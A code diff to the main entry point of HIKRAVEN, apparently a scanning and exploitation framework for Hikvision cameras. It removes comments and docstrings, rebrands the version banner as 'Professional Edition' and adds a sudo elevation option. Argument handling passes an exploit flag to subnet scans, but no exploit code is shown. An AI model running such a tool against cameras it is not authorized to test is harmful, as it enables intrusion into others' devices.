@@ -3617,7 +3408,6 @@ def parse_arguments():
     return parser.parse_args()
 
 def display_banner():
-    """Display custom cyberpunk banner"""
     banner = f"""
 {Fore.CYAN}                                                         
                          +?+                               
@@ -3636,7 +3426,7 @@ def display_banner():
 7#?            ..              {Fore.YELLOW}║   {Fore.RED}██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║{Fore.YELLOW}║
 #?             ..              {Fore.YELLOW}║   {Fore.RED}╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝{Fore.YELLOW}║
 ?              ..              {Fore.YELLOW}║                                        ║
-              ..               {Fore.YELLOW}║   {Fore.GREEN}HIKRAVEN v{__version__}{Fore.YELLOW}                        ║
+              ..               {Fore.YELLOW}║   {Fore.GREEN}HIKRAVEN - Professional Edition{Fore.YELLOW}            ║
              ..                {Fore.YELLOW}║   {Fore.GREEN}Advanced Hikvision Security Assessment Framework{Fore.YELLOW}   ║
             ..                 {Fore.YELLOW}╚════════════════════════════════════════╝
            ..                  {Fore.CYAN}┌────────────────────────────────────────────────┐
@@ -3651,7 +3441,6 @@ def display_banner():
     console.print()
 
 def list_interfaces():
-    """List available interfaces"""
     manager = InterfaceManager()
     interfaces = manager.interfaces
     
@@ -3684,19 +3473,15 @@ def list_interfaces():
     console.print(f"\n[dim]Total interfaces: {len(interfaces)}[/dim]")
 
 async def main_async(args):
-    """Async main function"""
     try:
         display_banner()
         
-        # List interfaces if requested
         if args.list_interfaces:
             list_interfaces()
             return
         
-        # Load configuration
         config = ConfigManager(args.config)
         
-        # Apply CLI overrides
         if args.threads:
             config.set('scan.max_threads', args.threads)
         if args.timeout:
@@ -3708,26 +3493,23 @@ async def main_async(args):
         if args.output:
             config.set('reporting.output_dir', args.output)
         
-        # Initialize
         app = HikRaven()
         
-        # Initialize with interface detection
         interface, local_ip = app.initialize(
             interface=args.interface,
             local_ip=args.address,
             verbose=args.verbose and not args.quiet,
-            auto_detect=args.auto_detect
+            auto_detect=args.auto_detect,
+            elevate=args.sudo
         )
         
-        # Determine scan type
         if args.passive:
             scan_type = 'passive'
         elif args.active:
             scan_type = 'active'
         else:
-            scan_type = 'active'  # Default
+            scan_type = 'active'
         
-        # Run scan
         result = await app.run_scan(
             scan_type=scan_type,
             subnet=args.subnet,
@@ -3735,17 +3517,14 @@ async def main_async(args):
             exploit=args.exploit
         )
         
-        # Print summary
         app.print_summary()
         
-        # Generate reports
         if args.report:
             formats = ['json', 'html', 'csv'] if args.report == 'all' else [args.report]
             reports = app.generate_reports(formats)
             for report in reports:
                 app.logger.success(f"Report saved: {report}")
         
-        # Save configuration
         if args.config:
             config.save()
         
@@ -3768,11 +3547,10 @@ async def main_async(args):
         sys.exit(1)
 
 def main():
-    """Main entry point"""
     args = parse_arguments()
     
     if args.version:
-        print(f"HIKRAVEN v{__version__}")
+        print("HIKRAVEN - Professional Edition")
         print(__description__)
         sys.exit(0)
     
